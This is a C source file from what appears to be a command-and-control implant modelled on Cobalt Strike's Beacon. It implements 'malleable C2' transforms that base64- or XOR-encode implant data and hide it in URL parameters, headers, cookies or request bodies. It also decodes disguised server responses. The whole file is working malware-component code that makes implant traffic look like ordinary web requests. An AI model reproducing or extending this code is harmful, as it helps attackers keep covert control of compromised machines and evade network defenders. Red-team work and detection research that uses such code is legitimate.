/*
    Apply transformations to HTTP(S) requests.
    Based on this - https://github.com/kyxiaxiang/Beacon_Source/blob/main/Beacon/transform.c
*/

#include "Transform.h"

#include  "Config.h"
#include "Parser.h"
#include "Utils.h"

// Message transformations
#define TRANSFORM_NONE 0x0
#define TRANSFORM_APPEND 0x1
#define TRANSFORM_PREPEND 0x2
#define TRANSFORM_BASE64 0x3
#define TRANSFORM_BASE64URL 0x4
#define TRANSFORM_XOR       0x5
#define TRANSFORM_PARAMETER 0x6         // Payload goes in parameter
#define TRANSFORM_HEADER 0x7            // Payload goes in header
#define TRANSFORM_COOKIE 0x8            // Payload goes in cookie
#define TRANSFORM_BODY 0x9              // Payload goes in body
#define TRANSFORM__PARAMETER 0x10       // Additional param value (no payload)
#define TRANSFORM__HEADER 0xA           // Additional header value (no payload)
#define TRANSFORM__COOKIE 0xB           // Additional cookie header value (no payload)
#define TRANSFORM__BODY 0xC             // Probably don't need this
#define TRANSFORM__HOSTHEADER 0xD       // not implemented yet

// Initialize a transform struct
BOOL TransformInit(TRANSFORM* transform, SIZE_T maxSize)
{
    #define MAX_HEADERS 1024
    #define MAX_URI_PARAMS 1024
    #define MAX_URI 1024
    #define MAX_COOKIES 4096

    // Initialize output length for transformations, set to a reasonable maximum
    transform->outputLength = max(3 * maxSize, 0x2000);

    // Initialize parser
    transform->parser = ParserAlloc(MAX_HEADERS + MAX_COOKIES + MAX_URI_PARAMS + MAX_URI + transform->outputLength + transform->outputLength + transform->outputLength);
    if (transform->parser == NULL)
    {
        _err("Failed to initialize parser.");
        return FALSE;
    }

    transform->headers = ParserGetDataPtr(transform->parser, MAX_HEADERS);
    transform->cookies = ParserGetDataPtr(transform->parser, MAX_COOKIES);
    transform->uriParams = ParserGetDataPtr(transform->parser, MAX_URI_PARAMS);
    transform->uri = ParserGetDataPtr(transform->parser, MAX_URI);
    transform->body = ParserGetDataPtr(transform->parser, transform->outputLength);
    transform->transformed = ParserGetDataPtr(transform->parser, transform->outputLength);
    transform->temp = ParserGetDataPtr(transform->parser, transform->outputLength);
    transform->bodyLength = 0;


    return TRUE;
}

// Apply malleable C2 modifications to the web request
BOOL TransformApply(TRANSFORM* transform, PBYTE bufferIn, UINT32 bufferLen, unsigned char* reqProfile)
{
#define MAX_PARAM 1024
#define MAX_TEMP 4096
#define MAX_REQUEST_PROFILE 1024

    char param[MAX_PARAM] = { 0 };
    int paramLength;

    // Unmodified payload to start
    SIZE_T transformedLength = bufferLen;    
    memcpy(transform->transformed, bufferIn, bufferLen);

    // Setup data parser with serialized profile
    PARSER parser;
    ParserDataParse(&parser, reqProfile, MAX_REQUEST_PROFILE);

    // First go through all URIs and pick 'random' one
    PCHAR   selectedUri = NULL;
    UINT32  NmbrOfUris  = ParserGetInt32(&parser);
    UINT32  ri          = (UINT32)((double)rand() / ((double)RAND_MAX + 1) * NmbrOfUris);
    
    for (UINT32 i = 0; i < NmbrOfUris; i++) 
    {   
        PCHAR   uri     = NULL; 
        SIZE_T  uriLen  = 0;
        if (i == ri) {
            uri             = ParserStringCopy(&parser, &uriLen);   // null terminated
            selectedUri     = uri;
            // Don't break cause we need to shift parser through all data
        } else {
            // Still need to read off the data from the parser
            uri = ParserGetString(&parser, &uriLen);
        }
        //_dbg("[TRANSFORM] FOUND URI nmbr %d \"%s\"", i + 1, uri);
    }
    
    //_dbg("[TRANSFORM] Selected URI \"%s\"", selectedUri);
    snprintf(transform->uri, MAX_URI, "%s", selectedUri);
    LocalFree(selectedUri);

    // Start Transformation Steps
	SIZE_T outlen; 
	for (int step = ParserGetInt32(&parser); step; step = ParserGetInt32(&parser))
	{
		switch (step)
		{
            // Base64 contents of payload
            case TRANSFORM_BASE64URL:
			case TRANSFORM_BASE64:
			{
                // _dbg("[TRANSFORM_BASE64] Applying...");//DEBUG
				
                outlen = calculate_base64_encoded_size(transformedLength);
                char* temp_encoded = (char *)LocalAlloc(LPTR, outlen + 1);
                
                if (temp_encoded == NULL)
                {
                    _err("Base64 encoding failed");
                    return FALSE;
                }

                int status = base64_encode((const unsigned char *)transform->transformed,  transformedLength, temp_encoded, &outlen);
                if (status != 0) {
                    LocalFree(temp_encoded);
                    return FALSE;
                }


                if (outlen > transform->outputLength)
                {
                    _err("Base64_url encoded data exceeds buffer size. Encoded size: %d, Buffer size: %d", outlen, transform->outputLength);
                    LocalFree(temp_encoded);
                    return FALSE;
                }

                memset(transform->transformed, 0, transform->outputLength);
                memcpy(transform->transformed, temp_encoded, outlen);

                transformedLength = outlen;

                LocalFree(temp_encoded);
                break;
			}
            // TODO : Not working with HTTPX profile
            // case TRANSFORM_BASE64URL:
            // {
            //     _dbg("[TRANSFORM_BASE64URL] Applying...");//DEBUG

            //     outlen = calculate_base64_encoded_size(transformedLength);
            //     char* temp_encoded = (char *)LocalAlloc(LPTR, outlen + 1);

            //     if (temp_encoded == NULL)
            //     {
            //         _err("Base64_url encoding failed");
            //         return FALSE;
            //     }

            //     int status = base64url_encode((const unsigned char *)transform->transformed,  transformedLength, temp_encoded, &outlen);
            //     if (status != 0) {
            //         LocalFree(temp_encoded);
            //         return FALSE;
            //     }


            //     if (outlen > transform->outputLength)
            //     {
            //         _err("Base64_url encoded data exceeds buffer size. Encoded size: %d, Buffer size: %d", outlen, transform->outputLength);
            //         LocalFree(temp_encoded);
            //         return FALSE;
            //     }

            //     memset(transform->transformed, 0, transform->outputLength);
            //     memcpy(transform->transformed, temp_encoded, outlen);

            //     transformedLength = outlen;

            //     LocalFree(temp_encoded);
            //     break;
			// }
            // XOR encodes payload
            case TRANSFORM_XOR:
            {
                //_dbg("[TRANSFORM_XOR] Applying...");
                SIZE_T len = 0;
                memset(param, 0, sizeof(param));
                ParserStringCopySafe(&parser, param, &len);

                // Use transform->temp as the buffer for XORed data
                if (!xor_encode((char*)transform->transformed, transformedLength, param, len, (char*)transform->temp)) {
                    _err("xor_encode transformation failed");
                    return FALSE;
                }

                if (transformedLength == 0) // size doesn't change for xor
					return FALSE;

                memset(transform->transformed, 0, transform->outputLength);
                memcpy(transform->transformed, transform->temp, transformedLength);
                break;
            }
            // Prepends value to payload
            case TRANSFORM_PREPEND:
            {
                //_dbg("[TRANSFORM_PREPEND] Applying...");
                SIZE_T len = 0;
                memset(param, 0, sizeof(param));
                ParserStringCopySafe(&parser, param, &len);

                memcpy(transform->temp, param, len);
                memcpy(transform->temp + len, transform->transformed, transformedLength);
                
                transformedLength += len;

                memset(transform->transformed, 0, transform->outputLength);
                memcpy(transform->transformed, transform->temp, transformedLength);
                break;
            }
            // Appends value to payload
            case TRANSFORM_APPEND:
            {
                //_dbg("[TRANSFORM_APPEND] Applying...");
                SIZE_T len = 0;
                memset(param, 0, sizeof(param));
                ParserStringCopySafe(&parser, param, &len);

                memcpy(transform->transformed + transformedLength, param, len);
                transformedLength += len;
                break;
            }
            // Arbitrary URL parameter (e.g., "?value=1235")
            case TRANSFORM__PARAMETER:
            {
                //_dbg("[TRANSFORM__PARAMETER] Applying...");
                SIZE_T len = 0;
                memset(param, 0, sizeof(param));
                ParserStringCopySafe(&parser, param, &len);

                if (*transform->uriParams)
					snprintf(transform->temp, MAX_TEMP, "%s&%s", transform->uriParams, param);
				else
					snprintf(transform->temp, MAX_TEMP, "?%s", param);
                
                memcpy(transform->uriParams, transform->temp, MAX_URI_PARAMS);
				break;
            }
            // Arbitrary header (e.g., "Header-Custom: Xenon")
            case TRANSFORM__HEADER:
            {
                //_dbg("[TRANSFORM__HEADER] Applying...");
                SIZE_T len = 0;
                memset(param, 0, sizeof(param));
                ParserStringCopySafe(&parser, param, &len);

                snprintf(transform->temp, MAX_TEMP, "%s%s\r\n", transform->headers, param);
				memcpy(transform->headers, transform->temp, MAX_HEADERS);
                break;
            }
            // Arbitrary Cookie header ("Cookie: value=1")
            case TRANSFORM__COOKIE:
            {
                //_dbg("[TRANSFORM__COOKIE] Applying...");
                SIZE_T len = 0;
                memset(param, 0, sizeof(param));
                ParserStringCopySafe(&parser, param, &len);

                snprintf(transform->temp, MAX_TEMP, "%s", param);

                memcpy(transform->cookies, transform->temp, MAX_COOKIES);
                break;
            }
            // Arbitrary host header
            case TRANSFORM__HOSTHEADER: // Not implemented
            {
                //_dbg("[TRANSFORM__HOSTHEADER] Applying...");
                break;
            }
            // Payload goes in URL Parameter
            case TRANSFORM_PARAMETER:
            {
                //_dbg("[TRANSFORM_PARAMETER] Applying...");
                SIZE_T len = 0;
                memset(param, 0, sizeof(param));
                ParserStringCopySafe(&parser, param, &len);

                if (*transform->uriParams)
                    snprintf(transform->temp, MAX_TEMP, "%s&%s=%s", transform->uriParams, param, transform->transformed);
                else
                    snprintf(transform->temp, MAX_TEMP, "?%s=%s", param, transform->transformed);

                memcpy(transform->uriParams, transform->temp, MAX_URI_PARAMS);
                break;
            }
            // Payload goes in Header
            case TRANSFORM_HEADER:
            {
                //_dbg("[TRANSFORM_HEADER] Applying...");
                SIZE_T len = 0;
                memset(param, 0, sizeof(param));
                ParserStringCopySafe(&parser, param, &len);

				snprintf(transform->temp, MAX_TEMP, "%s%s: %s\r\n", transform->headers, param, transform->transformed);

				memcpy(transform->headers, transform->temp, MAX_HEADERS);
                break;
            }
            // Payload goes in Cookie. Any additional arbitrary cookies would've been added to transform already.
            case TRANSFORM_COOKIE:
            {
                //_dbg("[TRANSFORM_COOKIE] Applying...");

                SIZE_T len = 0;
                memset(param, 0, sizeof(param));
                ParserStringCopySafe(&parser, param, &len);
                
                if (*transform->cookies)
					snprintf(transform->temp, MAX_TEMP, "%s; %s=%s\r\n", transform->cookies, param, transform->transformed);
				else
					snprintf(transform->temp, MAX_TEMP, "Cookie: %s=%s\r\n", param, transform->transformed);
                
                // Combine arbitrary cookies and payload cookie
                memcpy(transform->cookies, transform->temp, MAX_COOKIES);

                // Add final cookie to headers
                memset(transform->temp, 0, MAX_TEMP);
                snprintf(transform->temp, MAX_TEMP, "%s%s", transform->headers, transform->cookies);
                memcpy(transform->headers, transform->temp, MAX_HEADERS);
                break;
            }
            // Payload goes in Body
            case TRANSFORM_BODY:
            {
                //_dbg("[TRANSFORM_BODY] Applying...");

                // Set body pointer and size to final payload
                transform->body = transform->transformed;
                transform->bodyLength = transformedLength;
                break;
            }
        }
	}

    return TRUE;
}

// Undo malleable C2 modifications from the server response
BOOL TransformReverse(char* recoverable, DWORD recoverableLength, SIZE_T* recoveredDataLen, unsigned char* resProfile, int maxGet)
{

#define MAX_RESPONSE_PROFILE 1024

    char* temp = malloc(recoverableLength);
	if (temp == NULL)
		return FALSE;


    PARSER parser;
    ParserDataParse(&parser, resProfile, MAX_RESPONSE_PROFILE);

    int param;
    unsigned long outlen;

    for (int step = ParserGetInt32(&parser); step; step = ParserGetInt32(&parser))
    {
        switch (step)
        {
        // case TRANSFORM_BASE64URL:
        case TRANSFORM_BASE64:
        {
            // _dbg("[REVERSE_BASE64] ...");
            int status;

            recoverable[recoverableLength] = 0;
            
            outlen = maxGet;
            
            if ((status = base64_decode((const char*)recoverable, recoverableLength, temp, &outlen)) != 0) {
                _err("base64_decode failed ERROR : %d", status);
                return FALSE;
            }

            recoverableLength = outlen;

            if (recoverableLength == 0)
					return FALSE;

            memcpy(recoverable, temp, recoverableLength);
            break;
        }
        case TRANSFORM_BASE64URL:
        {
            // _dbg("[REVERSE_BASE64URL] ...");
            int status;

            recoverable[recoverableLength] = 0;
            
            outlen = maxGet;

            if ((status = base64url_decode((const char*)recoverable, recoverableLength, temp, &outlen)) != 0) {
                _err("base64url_decode failed. ERROR : %d", status);
                return FALSE;
            }
            
            recoverableLength = outlen;

            if (recoverableLength == 0) {
                _err("No data recovered");
                return FALSE;
            }

            memcpy(recoverable, temp, recoverableLength);
            break;

        }
        case TRANSFORM_XOR:
        {
            //_dbg("[TRANSFORM_XOR] Reversing...");

            SIZE_T len = 0;
            PCHAR value = ParserGetString(&parser, &len);
            
            recoverable[recoverableLength] = 0;
            
            if (!xor_encode((char*)recoverable, recoverableLength, value, len, temp)) {
                _err("xor_encode transformation failed");
                return FALSE;
            }

            if (recoverableLength == 0)
                return FALSE;

            memcpy(recoverable, temp, recoverableLength);
            recoverable[recoverableLength] = 0;
            break;
        }
        case TRANSFORM_PREPEND:
        {
            //_dbg("[TRANSFORM_PREPEND] Reversing...");

            UINT32 len = ParserGetInt32(&parser);
            if (len > recoverableLength)
            {
                _err("Prepend parameter %d is greater than recoverable length %d", len, recoverableLength);
                return FALSE;
            }

            memcpy(temp, recoverable, recoverableLength);
            recoverableLength -= len;
            memcpy(recoverable, temp + len, recoverableLength);
            break;
        }
        case TRANSFORM_APPEND:
        {
            //_dbg("[TRANSFORM_APPEND] Reversing...");
            
            UINT32 len = ParserGetInt32(&parser);
            recoverableLength -= len;
            if (recoverableLength <= 0)
                return FALSE;

            break;
        }
        default:
            break;
        }
    }

    // Write recoverd data length to output variable
    *recoveredDataLen = recoverableLength;

    free(temp);
    
    return TRUE;
}

void TransformDestroy(TRANSFORM* transform)
{
	ParserDestroy(transform->parser);
}